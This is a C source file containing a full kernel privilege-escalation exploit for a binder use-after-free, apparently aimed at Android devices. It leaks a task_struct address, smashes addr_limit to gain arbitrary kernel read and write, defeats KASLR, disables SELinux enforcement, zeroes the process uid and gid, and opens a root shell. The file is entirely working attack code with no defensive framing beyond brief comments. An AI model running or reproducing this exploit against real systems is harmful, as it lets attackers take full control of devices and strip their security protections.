#define _GNU_SOURCE  
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>

#define BINDER_THREAD_EXIT 0x40046208
#define INIT_USER_NS 0x94ee8f0
#define SELINUX_ENFORCING 0x96b6c10

// offsetof(binder_thread.wait.task_list.next) = 0xA8
#define OFFSET_BINDER_WAITTASK_NEXT 0xA8
// offsetof(binder_thread.task) = 0x190
#define OFFSET_BINDER_TASK 0x190
// offsetof(task_struct.thread_info.addr_limit) = 0x8
#define OFFSET_ADDR_LIMIT 8
// offsetof(task_struct.cred) = 0x760
#define OFFSET_CRED 0x760
// offsetof(task_struct.user_ns) = 0x88
#define OFFSET_USER_NS 0x88
// offsetof(cred.uid) = 4
#define OFFSET_UID 4
// offsetof(cred.gid) = 8
#define OFFSET_GID 8

void dump(char *data, size_t nb_pointers) {
  uint64_t *leak = (uint64_t *)data;

  printf("0000: ");
  for (size_t i = 0; i < nb_pointers; i++) {
    printf("%016lx ", leak[i]);

    if ((i + 1) % 4 == 0) {
      printf("\n");
      if (i + 1 < nb_pointers) {
        printf("%04lX: ", (i + 1) * 8);
      }
    }
  }
}

uint64_t leak_task_struct() {
  // Prepare the binder  
  int fd_binder = open("/dev/binder", O_RDONLY);
  if (fd_binder == -1) {
    perror("open");
  }
  int epfd = epoll_create(1000);
  if (epfd == 1) {
    perror("epfd");
  }
  struct epoll_event event = { .events = EPOLLIN };
  epoll_ctl(epfd, EPOLL_CTL_ADD, fd_binder, &event);    // Allocate

  // Prepare the iovec buffer 
  // Its low 4 bytes address must be equal to 0
  char* iobuf = (char*) mmap((void*)0x1000000000, 0x1000, 
      PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);
  if (iobuf < 0) {
    perror("mmap");
    return 0;
  }
  memset(iobuf, 0x41, 0x1000);

  // Prepare the iovec
  struct iovec iov[25];
  memset(iov, 0, sizeof(iov));
  iov[10].iov_base = iobuf;
  iov[10].iov_len = 0x1000;

  char tmp[0x1000];
  memset(tmp, 0x42, sizeof(tmp));
  iov[11].iov_base = tmp;
  iov[11].iov_len = 0x1000;

  int pipefd[2];
  pipe(pipefd);
  fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000);

  int fork_pid = fork();
  if (!fork_pid) {                                       // Parent process
    sleep(1);
    epoll_ctl(epfd, EPOLL_CTL_DEL, fd_binder, &event);   // UAF
    
    char data[0x1000];
    read(pipefd[0], data, sizeof(data));
    
    exit(0);
  }
  printf("Free the binder object and writev()\n");
  ioctl(fd_binder, BINDER_THREAD_EXIT, NULL);           // Free 
  writev(pipefd[1], iov, 25);
  
  // Read back our binder thread object  
  // We have overwritten the pointer at +0xa0
  printf("UAF triggered, reading back the values\n");
  char data[0x1000];
  memset(data, 0, sizeof(data));
  read(pipefd[0], data, sizeof(data));
  dump(data, 16);

  char* binder_thread = data;
  uint64_t task_struct = *(uint64_t*)(
      binder_thread - OFFSET_BINDER_WAITTASK_NEXT + OFFSET_BINDER_TASK);
  return task_struct;
}

void smash_address(uint64_t target_address, uint64_t smash_value) {
  // Prepare the binder  
  int fd_binder = open("/dev/binder", O_RDONLY);
  if (fd_binder == -1) {
    perror("open");
  }
  int epfd = epoll_create(1000);
  if (epfd == 1) {
    perror("epfd");
  }
  struct epoll_event event = { .events = EPOLLIN };
  epoll_ctl(epfd, EPOLL_CTL_ADD, fd_binder, &event);    // Allocate

  // Prepare the iovec buffer 
  // Its address low 4 bytes must be equal to 0
  char* iobuf = (char*) mmap((void*)0x2000000000, 0x1000, 
      PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);
  if (iobuf < 0) {
    perror("mmap");
    return;
  }
  memset(iobuf, 0x41, 0x1000);

  // Prepare the iovec
  struct iovec iov[25];
  memset(iov, 0, sizeof(iov));
  iov[10].iov_base = iobuf;
  iov[10].iov_len = 8;
  iov[11].iov_base = iobuf;
  iov[11].iov_len = 0x20;
  iov[12].iov_base = iobuf;
  iov[12].iov_len = 8;

  int fds[2];
  socketpair(AF_UNIX, SOCK_STREAM, 0, fds);  

  int fork_pid = fork();
  if (!fork_pid) {                                      // Parent process
    sleep(1);
    
    char buff[0x1000];
    memset(buff, 0x41, sizeof(buff));
    *(uint64_t*)(buff + 0x00) = 0xcafecafe;  
    *(uint64_t*)(buff + 0x08) = 0xcafecafe;  
    *(uint64_t*)(buff + 0x10) = 0xcafecafe;  
    *(uint64_t*)(buff + 0x18) = target_address;  
    *(uint64_t*)(buff + 0x20) = smash_value;  
  
    write(fds[1], buff, 8);   // make it wait
    epoll_ctl(epfd, EPOLL_CTL_DEL, fd_binder, &event);   // UAF
    write(fds[1], buff, 0x20 + 0x08);  
    // 0x20: overwrite iovec buffer address
    // 0x08: do a normal write on the iovec buffer
    exit(0);
  }
  printf("Free the binder object and recvmsg()\n");
  ioctl(fd_binder, BINDER_THREAD_EXIT, NULL);           // Free 
  
  struct msghdr msg = {
    .msg_iov = iov,
    .msg_iovlen = 25
  };
  recvmsg(fds[0], &msg, MSG_WAITALL);
  wait(0);
}

void readn_kernel(uint64_t kernel_addr, void* obj, size_t size) {
  int pipefd[2];
  pipe(pipefd);
  write(pipefd[1], (void*)kernel_addr, size);  
  read(pipefd[0], obj, size);
}
uint64_t read64_kernel(uint64_t kernel_addr) {
  uint64_t value = 0;
  readn_kernel(kernel_addr, &value, sizeof(value));
  return value;
}
void write32_kernel(unsigned long long kernel_addr, uint32_t value) {
  int pipefd[2];
  pipe(pipefd);
  write(pipefd[1], &value, 4);  
  read(pipefd[0], (void*)kernel_addr, 4);
}

void pincpu() {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set); 
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
    perror("setaffinity");
  }
}

int main() {
  pincpu();

  printf("-- LEAK\n");
  uint64_t task_struct = leak_task_struct();  
  if (!task_struct) {
    return 1;
  }
  printf("task_struct: 0x%016lx\n", task_struct);

  printf("\n-- SMASH\n");
  smash_address(task_struct + OFFSET_ADDR_LIMIT, 0xffffffffffffffff);

  printf("\n-- PRIVESC\n");
  uint64_t cred = read64_kernel(task_struct + OFFSET_CRED); 
  uint64_t user_ns = read64_kernel(cred + OFFSET_USER_NS);
  printf("user_ns = %016lx\n", user_ns);
  uint64_t kernel_base = user_ns - INIT_USER_NS;
  printf("kernel base = %016lx\n", kernel_base);        // KASLR bypass

  printf("Overwriting selinux_enforcing\n");
  write32_kernel(kernel_base + SELINUX_ENFORCING, 0);    

  printf("Setting sid and gid to 0\n");  
  write32_kernel(cred + OFFSET_UID, 0);  
  write32_kernel(cred + OFFSET_GID, 0);  

  printf("Opening a root shell\n");
  system("/bin/sh");
  
  return 0;
}
